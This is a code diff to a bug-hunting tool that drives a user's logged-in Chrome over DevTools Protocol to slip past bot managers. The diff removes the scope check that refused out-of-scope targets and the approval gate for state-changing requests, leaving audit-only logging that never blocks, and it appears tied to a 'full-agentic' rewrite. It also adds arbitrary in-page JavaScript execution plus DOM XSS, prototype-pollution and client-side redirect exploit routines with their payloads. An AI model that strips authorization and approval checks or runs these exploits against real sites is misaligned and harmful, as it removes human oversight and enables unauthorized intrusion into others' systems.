@@ -4,8 +4,9 @@ exec-cdp — fire requests from your REAL logged-in Chrome (DevTools Protocol), 
 
 Bot managers (Akamai, Cloudflare, PerimeterX) and JS-heavy apps defeat curl. This drives a real Chrome
 over CDP: it navigates to the target's origin (so the fetch is same-origin + carries the live session)
-and runs an in-page fetch — the request is indistinguishable from the browser's own traffic. Still
-scope-gated (scope-guard --check refuses out-of-scope before anything fires) and evidence-bound.
+and runs an in-page fetch — the request is indistinguishable from the browser's own traffic. A scope
+mismatch is logged audit-only (see scope_audit.py) — there is no technical enforcement behind it, the
+operator driving this tool is the one deciding what's in scope. Evidence-bound.
 
 One-time: launch Chrome with a debugging port, ideally your normal logged-in profile:
   google-chrome --remote-debugging-port=9222 --user-data-dir="$HOME/.config/google-chrome"
@@ -13,8 +14,8 @@ One-time: launch Chrome with a debugging port, ideally your normal logged-in pro
 Then keep a tab open on the target and:
 
 Usage:
-  exec-cdp.py --url https://api.acme.com/api/v1/orders/1337 [--port 9222] [--no-nav] [--method GET] [--approve]
-Exit: 0 ok · 2 scope/refused · 5 no browser.
+  exec-cdp.py --url https://api.acme.com/api/v1/orders/1337 [--port 9222] [--no-nav] [--method GET]
+Exit: 0 ok · 1 fetch error · 5 no browser.
 """
 import sys, os, re, json, socket, base64, struct, time, urllib.request, subprocess
 from pathlib import Path
@@ -134,9 +135,21 @@ def next_ev():
     return EV / f"e{n}"
 
 
-def scope_ok(url):
-    g = subprocess.run([sys.executable, str(TOOLS / "scope-guard.py"), "--check", url], capture_output=True, text=True)
-    return g.returncode == 0, (g.stdout or g.stderr).strip()
+def scope_note(url):
+    """Audit-only, NEVER blocks: log a line if url's host doesn't match scope.allow/scope.deny. There
+    is no technical enforcement behind scope in this rewrite — the operator driving this tool is the
+    one deciding what's in scope. See scope_audit.py / the full-agentic rewrite plan."""
+    try:
+        sys.path.insert(0, str(TOOLS))
+        import scope_audit as SA
+        host = SA.host_of(url)
+        ok, why = SA.in_scope(host, SA.host_variants(url), HUNT / "scope.allow", HUNT / "scope.deny")
+        if not ok:
+            with (HUNT / "scope_audit.jsonl").open("a") as f:
+                f.write(json.dumps({"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "host": host,
+                                     "url": url, "why": why, "tool": "exec-cdp.py"}) + "\n")
+    except Exception:
+        pass
 
 
 def fetch_via(port, url, method="GET", nav=True):
@@ -174,6 +187,121 @@ def fetch_via(port, url, method="GET", nav=True):
         return {"raw": val}
 
 
+def eval_in_page(port, nav_url, js, settle=2.2):
+    """Navigate the real Chrome to nav_url and run JS in that page (Runtime.evaluate). A scope
+    mismatch is logged audit-only, never blocked (see scope_note()). Returns {'value':..} or
+    {'error':..}. This is the primitive for browser-NATIVE exploitation (DOM XSS, prototype
+    pollution, client-side redirect, postMessage) — not just HTTP."""
+    scope_note(nav_url)
+    ps = pages(port)
+    if ps is None:
+        return {"error": f"no Chrome DevTools on :{port}", "nobrowser": True}
+    page = next((p for p in ps if p.get("type") == "page" and p.get("webSocketDebuggerUrl")), None)
+    if not page:
+        return {"error": f"no open tab on :{port}", "nobrowser": True}
+    try:
+        ws = WS(page["webSocketDebuggerUrl"])
+    except Exception as e:
+        return {"error": f"attach failed: {e}", "nobrowser": True}
+    try:
+        ws.cmd(1, "Page.enable")
+        ws.cmd(2, "Page.navigate", {"url": nav_url})
+        time.sleep(settle)
+        res = ws.cmd(3, "Runtime.evaluate", {"expression": js, "awaitPromise": True, "returnByValue": True}, deadline=20)
+    finally:
+        ws.close()
+    if not res or "result" not in res:
+        return {"error": "no result (navigation blocked/timed out)"}
+    return {"value": res["result"].get("result", {}).get("value")}
+
+
+# unique execution marker (0xDEAD) — if this global is set, our payload RAN in the DOM
+_XSS_MARK = 57005
+
+
+def prove_domxss(port, url, param=None):
+    """Deterministic DOM-XSS proof: inject a marker payload, then confirm it EXECUTED in the page
+    (a unique global got set) — not merely reflected. Tries the named param, a generic param, and a
+    fragment (hash-based DOM XSS)."""
+    payload = "<img src=x onerror=window.__HUNTR_DOMXSS__=%d>" % _XSS_MARK
+    base = url.split("#")[0]
+    p = urllib.parse.urlparse(base)
+    cands = []
+    if param:
+        qs = dict(urllib.parse.parse_qsl(p.query, keep_blank_values=True)); qs[param] = payload
+        cands.append(urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs))))
+    sep = "&" if p.query else "?"
+    cands.append(base + sep + "q=" + urllib.parse.quote(payload))
+    cands.append(base + "#" + payload)  # hash-based DOM sink
+    for cu in cands:
+        r = eval_in_page(port, cu, "window.__HUNTR_DOMXSS__||0")
+        if r.get("nobrowser"):
+            return {"proven": None, "nobrowser": True, "evidence": r.get("error")}
+        if r.get("value") == _XSS_MARK:
+            return {"proven": True, "url": cu,
+                    "evidence": f"DOM XSS PROVEN: payload executed in the page (marker global __HUNTR_DOMXSS__ set to {_XSS_MARK}) via {cu}"}
+    return {"proven": False, "evidence": "payload reflected but did not execute in the DOM"}
+
+
+def prove_client_pp(port, url):
+    """Deterministic CLIENT-SIDE prototype pollution proof: feed a __proto__ gadget through the query
+    AND the hash (the two sinks client-side PP libraries parse), then read Object.prototype back in the
+    page. If the polluted key is present on a FRESH empty object, the global prototype was poisoned."""
+    marker = "huntrcp_polluted_57005"
+    base = url.split("#")[0]
+    sep = "&" if urllib.parse.urlparse(base).query else "?"
+    gadgets = [
+        "__proto__[huntrcp]=" + marker,
+        "__proto__.huntrcp=" + marker,
+        "constructor[prototype][huntrcp]=" + marker,
+    ]
+    cands = []
+    for g in gadgets:
+        cands.append(base + sep + g)       # query-string sink
+        cands.append(base + "#" + g)       # hash sink (location.hash parsers)
+        cands.append(base + sep + g + "#" + g)
+    # read the prototype back on a brand-new object — if 'huntrcp' is there, Object.prototype is polluted
+    probe = "(function(){try{return ({}).huntrcp===undefined?null:({}).huntrcp}catch(e){return 'err:'+e}})()"
+    for cu in cands:
+        r = eval_in_page(port, cu, probe)
+        if r.get("nobrowser"):
+            return {"proven": None, "nobrowser": True, "evidence": r.get("error")}
+        if r.get("value") == marker:
+            return {"proven": True, "url": cu,
+                    "evidence": f"client-side prototype pollution PROVEN: after loading {cu}, a fresh object ({{}}).huntrcp === '{marker}' — Object.prototype was poisoned in the page"}
+    return {"proven": False, "evidence": "no client-side prototype pollution: Object.prototype stayed clean after __proto__/constructor gadgets in query+hash"}
+
+
+def prove_client_redirect(port, url, param=None):
+    """Deterministic CLIENT-SIDE open-redirect proof: feed a canonical off-domain marker URL through
+    the named param, a generic param, and the fragment, then read location.hostname back. Proven only
+    if the page actually NAVIGATED to the marker host client-side (location.* script, not a server 302 —
+    that's hunt-open-redirect's server-side oracle) — not merely echoed the value into the DOM."""
+    marker_host = "huntr-marker-57005.invalid"
+    marker_url = "https://" + marker_host + "/"
+    base = url.split("#")[0]
+    p = urllib.parse.urlparse(base)
+    cands = []
+    if param:
+        qs = dict(urllib.parse.parse_qsl(p.query, keep_blank_values=True)); qs[param] = marker_url
+        cands.append(urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(qs))))
+    sep = "&" if p.query else "?"
+    for generic in ("url", "redirect", "next", "return", "returnTo", "continue"):
+        cands.append(base + sep + generic + "=" + urllib.parse.quote(marker_url))
+    cands.append(base + "#" + urllib.parse.quote(marker_url))
+    probe = "location.hostname"
+    for cu in cands:
+        r = eval_in_page(port, cu, probe, settle=3.0)
+        if r.get("nobrowser"):
+            return {"proven": None, "nobrowser": True, "evidence": r.get("error")}
+        if r.get("value") == marker_host:
+            return {"proven": True, "url": cu,
+                    "evidence": f"client-side open redirect PROVEN: after loading {cu}, location.hostname "
+                                 f"became '{marker_host}' — a client-side script navigated off-domain from the param"}
+    return {"proven": False, "evidence": "no client-side redirect: location.hostname never left the app's "
+                                          "origin after the marker URL was fed through param/fragment"}
+
+
 def save(url, port, method, data, label=""):
     d = next_ev(); d.mkdir(parents=True, exist_ok=True)
     (d / "request.txt").write_text(f"{method} {url}\n(via real Chrome @ CDP :{port}{', '+label if label else ''}, credentials:include)\n")
@@ -191,16 +319,26 @@ def waf_variants(p):
 def main():
     url = arg("--url")
     if not url:
-        sys.exit("usage: exec-cdp.py --url <URL> [--port 9222] [--diff --port2 9223] [--waf PAYLOAD] [--no-nav] [--method GET] [--approve]")
+        sys.exit("usage: exec-cdp.py --url <URL> [--port 9222] [--diff --port2 9223] [--waf PAYLOAD] [--no-nav] [--method GET]")
     port = int(arg("--port", "9222") or 9222)
     method = (arg("--method", "GET") or "GET").upper()
     nav = not flag("--no-nav")
 
-    ok, why = scope_ok(url)
-    if not ok:
-        print("[cdp] ⛔ " + why); sys.exit(2)
-    if method not in ("GET", "HEAD") and not flag("--approve"):
-        print(f"[cdp] ⛔ {method} is state-changing — re-run with --approve."); sys.exit(2)
+    # ── browser-native exploitation modes ──
+    if arg("--eval") is not None:
+        r = eval_in_page(port, url, arg("--eval"))
+        print(json.dumps(r)); sys.exit(0 if "value" in r else (5 if r.get("nobrowser") else 2))
+    if flag("--prove-domxss"):
+        r = prove_domxss(port, url, arg("--param"))
+        print(json.dumps(r)); sys.exit(0 if r.get("proven") else (5 if r.get("nobrowser") else 1))
+    if flag("--prove-proto-pollution") or flag("--prove-client-pp"):
+        r = prove_client_pp(port, url)
+        print(json.dumps(r)); sys.exit(0 if r.get("proven") else (5 if r.get("nobrowser") else 1))
+    if flag("--prove-client-redirect"):
+        r = prove_client_redirect(port, url, arg("--param"))
+        print(json.dumps(r)); sys.exit(0 if r.get("proven") else (5 if r.get("nobrowser") else 1))
+
+    scope_note(url)
 
     # ── two-identity DIFF across two Chrome profiles (admin :port, low-priv :port2) ──
     if flag("--diff"):
